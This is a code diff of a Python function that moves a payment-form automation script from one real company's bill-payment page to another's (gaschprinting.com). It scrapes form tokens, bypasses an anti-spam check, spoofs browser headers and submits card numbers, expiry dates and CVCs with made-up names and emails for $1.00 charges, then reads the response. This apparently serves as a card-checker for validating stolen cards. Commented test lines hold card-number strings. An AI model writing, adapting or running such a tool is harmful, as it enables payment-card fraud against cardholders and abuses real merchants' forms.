@@ -60,33 +60,85 @@ def Tele(ccx):
     sess = generate_random_code()
     nr = random.randint(100000, 999999)
     lr = random.randint(1000, 9999)
+    d1 = random.randint(1, 4)
+    d2 = random.randint(1, 99)
     
-    url = "https://okcontainer.com/bill-payment-oklahoma-container/"
-    
-    # Browser တစ်ခုလို ဟန်ဆောင်ဖို့ Header ထည့်ပေးရမယ်
     headers = {
-        "User-Agent": user,
-        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
-        "Accept-Language": "en-US,en;q=0.5",
+        'authority': 'gaschprinting.com',
+        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
+        'cache-control': 'max-age=0',
+        #'if-modified-since': 'Mon, 27 Apr 2026 17:50:34 GMT',
+        'referer': 'https://www.google.com/',
+        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
+        'sec-ch-ua-mobile': '?1',
+        'sec-ch-ua-platform': '"Android"',
+        'sec-fetch-dest': 'document',
+        'sec-fetch-mode': 'navigate',
+        'sec-fetch-site': 'cross-site',
+        'sec-fetch-user': '?1',
+        'upgrade-insecure-requests': '1',
+        'user-agent': user,
     }
     
-    response = session.get(url, headers=headers)
-    #content = response.content.decode('utf-8', errors='ignore')
+    response = session.get('https://gaschprinting.com/payment/', headers=headers)
     
-    ajax = re.search(r"hash=(.*?)'", response.text).group(1)
+    ajax = re.search(r"&amp;hash=(.*?)'", response.text).group(1)
     currency = re.search(r"data-currency='USD' value='(.*?)'", response.text).group(1)
-    state = re.search(r"name='state_3' value='(.*?)'", response.text).group(1)
+    state = re.search(r"name='state_17' value='(.*?)'", response.text).group(1)
     version = re.search(r'"version_hash":"(.*?)"', response.text).group(1)
     #print(version)
     
     headers = {
-        'authority': 'okcontainer.com',
+        'authority': 'gaschprinting.com',
+        'accept': '*/*',
+        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
+        #'content-type': 'multipart/form-data; boundary=----WebKitFormBoundarysZBh1P8FPB664qH2',
+        # 'cookie': '_ga_N1RGE1QFPY=GS2.1.s1777346171$o1$g0$t1777346171$j60$l0$h0; _ga_ZHE15SD08C=GS2.1.s1777346172$o1$g0$t1777346172$j60$l0$h0; _gid=GA1.2.353576958.1777346172; _ga_RWYLJZJJB6=GS2.1.s1777346172$o1$g0$t1777346172$j60$l0$h0; _ga=GA1.1.714877889.1777346172; __hstc=256288468.4c1899bee07bf938a0ed6db2bce1829c.1777346173495.1777346173495.1777346173495.1; hubspotutk=4c1899bee07bf938a0ed6db2bce1829c; __hssrc=1; __hssc=256288468.1.1777346173496; cookie_notice_accepted=false',
+        'origin': 'https://gaschprinting.com',
+        'referer': 'https://gaschprinting.com/payment/',
+        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
+        'sec-ch-ua-mobile': '?1',
+        'sec-ch-ua-platform': '"Android"',
+        'sec-fetch-dest': 'empty',
+        'sec-fetch-mode': 'cors',
+        'sec-fetch-site': 'same-origin',
+        'user-agent': user,
+    }
+    
+    files = {
+        'action': (None, 'gf_zero_spam_token'),
+        'form_id': (None, '17'),
+    }
+    
+    response = session.post('https://gaschprinting.com/wp-admin/admin-ajax.php', #cookies=cookies, 
+    headers=headers, files=files)
+    
+    zero = response.json()['token']
+    #print(zero)
+    
+    cookies = {
+        '_ga_N1RGE1QFPY': 'GS2.1.s1777346171$o1$g0$t1777346171$j60$l0$h0',
+        '_ga_ZHE15SD08C': 'GS2.1.s1777346172$o1$g0$t1777346172$j60$l0$h0',
+        '_gid': 'GA1.2.353576958.1777346172',
+        '_ga_RWYLJZJJB6': 'GS2.1.s1777346172$o1$g0$t1777346172$j60$l0$h0',
+        '_ga': 'GA1.1.714877889.1777346172',
+        '__hstc': '256288468.4c1899bee07bf938a0ed6db2bce1829c.1777346173495.1777346173495.1777346173495.1',
+        'hubspotutk': '4c1899bee07bf938a0ed6db2bce1829c',
+        '__hssrc': '1',
+        '__hssc': '256288468.1.1777346173496',
+        'cookie_notice_accepted': 'false',
+    }
+    
+    headers = {
+        'authority': 'gaschprinting.com',
         'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
         'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
         'cache-control': 'max-age=0',
-        #'content-type': 'multipart/form-data; boundary=----WebKitFormBoundary7BmMmAMq7PQk6AFl',
-        'origin': 'https://okcontainer.com',
-        'referer': 'https://okcontainer.com/bill-payment-oklahoma-container/',
+        #'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryJcha4meBsJYFnYRC',
+        # 'cookie': '_ga_N1RGE1QFPY=GS2.1.s1777346171$o1$g0$t1777346171$j60$l0$h0; _ga_ZHE15SD08C=GS2.1.s1777346172$o1$g0$t1777346172$j60$l0$h0; _gid=GA1.2.353576958.1777346172; _ga_RWYLJZJJB6=GS2.1.s1777346172$o1$g0$t1777346172$j60$l0$h0; _ga=GA1.1.714877889.1777346172; __hstc=256288468.4c1899bee07bf938a0ed6db2bce1829c.1777346173495.1777346173495.1777346173495.1; hubspotutk=4c1899bee07bf938a0ed6db2bce1829c; __hssrc=1; __hssc=256288468.1.1777346173496; cookie_notice_accepted=false',
+        'origin': 'https://gaschprinting.com',
+        'referer': 'https://gaschprinting.com/payment/',
         'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
         'sec-ch-ua-mobile': '?1',
         'sec-ch-ua-platform': '"Android"',
@@ -99,43 +151,46 @@ def Tele(ccx):
     }
     
     files = [
-        ('input_14', (None, '')),
-        ('input_7', (None, '')),
         ('input_1.3', (None, f'{first_name}')),
         ('input_1.6', (None, f'{last_name}')),
-        ('input_2', (None, f'yellhtetgaung{nr}@gmail.com')),
-        ('input_2_2', (None, f'yellhtetgaung{nr}@gmail.com')),
-        ('input_3', (None, f'(430) 300-{lr}')),
-        ('input_9[]', (None, '1')),
-        ('input_6', (None, '$1.00')),
-        ('input_13.1', (None, f'{n}')),
-        ('input_13.2[]', (None, f'{mm}')),
-        ('input_13.2[]', (None, f'20{yy}')),
-        ('input_13.3', (None, f'{cvc}')),
-        ('input_13.5', (None, f'{first_name} {last_name}')),
-        ('gform_ajax', (None, f'form_id=3&title=&description=&tabindex=0&theme=gravity-theme&styles=[]&hash={ajax}')),
+        ('input_5', (None, '')),
+        ('input_9', (None, f'430300{lr}')),
+        ('input_8', (None, '1')),
+        ('input_2', (None, '$1.00')),
+        ('input_3', (None, f'yellhtetgaung{nr}@gmail.com')),
+        ('input_4', (None, '')),
+        ('input_7', (None, '$1.00')),
+        ('input_6.1', (None, f'{n}')),
+        ('input_6.2[]', (None, f'{mm}')),
+        ('input_6.2[]', (None, f'20{yy}')),
+        ('input_6.3', (None, f'{cvc}')),
+        ('input_6.5', (None, f'{first_name} {last_name}')),
+        ('gform_ajax', (None, f'form_id=17&title=&description=&tabindex=0&theme=gravity-theme&styles=[]&hash={ajax}')),
         ('gform_submission_method', (None, 'iframe')),
         ('gform_theme', (None, 'gravity-theme')),
         ('gform_style_settings', (None, '[]')),
-        ('is_submit_3', (None, '1')),
-        ('gform_submit', (None, '3')),
+        ('is_submit_17', (None, '1')),
+        ('gform_submit', (None, '17')),
         ('gform_currency', (None, f'{currency}')),
         ('gform_unique_id', (None, '')),
-        ('state_3', (None, f'{state}')),
-        ('gform_target_page_number_3', (None, '0')),
-        ('gform_source_page_number_3', (None, '1')),
+        ('state_17', (None, f'{state}')),
+        ('gform_target_page_number_17', (None, '0')),
+        ('gform_source_page_number_17', (None, '1')),
         ('gform_field_values', (None, '')),
         ('version_hash', (None, f'{version}')),
-        ('gform_submission_speeds', (None, '{"pages":{"1":[54005]}}')),
+        ('gform_submission_speeds', (None, '{"pages":{"1":[87493]}}')),
+        ('gf_zero_spam_token', (None, f'{zero}')),
     ]
     
-    response = session.post('https://okcontainer.com/bill-payment-oklahoma-container/', headers=headers, files=files)
+    response = session.post('https://gaschprinting.com/payment/', #cookies=cookies, 
+    headers=headers, files=files)
     
     try:
         result = re.search(r"class='gfield_description validation_message gfield_validation_message'><!-- (.*?)<\/div><\/fieldset>", response.text).group(1)
     except:
-        result = re.search(r"class='gform_confirmation_message_3 gform_confirmation_message'>(.*?)<\/h4>", response.text).group(1)
+        result = re.search(r"class='gform_confirmation_message_17 gform_confirmation_message'>(.*?)<\/div><\/div>", response.text).group(1)
+
     return result
     
-#test_card = "4744722125678468|09|27|542"
+#test_card = "5132848403801477|04|2026|399"
 #print(Tele(test_card))
